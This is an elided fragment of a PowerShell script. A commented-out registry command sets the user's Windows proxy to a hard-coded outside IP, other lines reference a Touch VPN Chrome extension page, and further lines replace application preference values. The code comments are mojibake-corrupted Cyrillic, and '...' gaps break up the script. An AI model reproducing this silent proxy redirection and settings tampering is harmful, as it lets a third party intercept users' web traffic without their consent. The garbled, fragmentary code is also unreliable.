...
#reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 157.230.91.240:80 /f
start-sleep –s 5
...
$arg1 = “https://chrome.google.com/webstore/detail/touch-vpn/bihmplhobchoageeokmgbdihknkjbknd?hl=ru”
...
$prefs = $11 + $12
# ôîðìèðóåì çíà÷åíèÿ ïîäëåæàùèå çàìåíå
$userpref1old = $13
$userpref2old = "UsefulTips>Yes</ShowU"
# ôîðìèðóåì íîâûå çíà÷åíèÿ
$userpref1new = $14
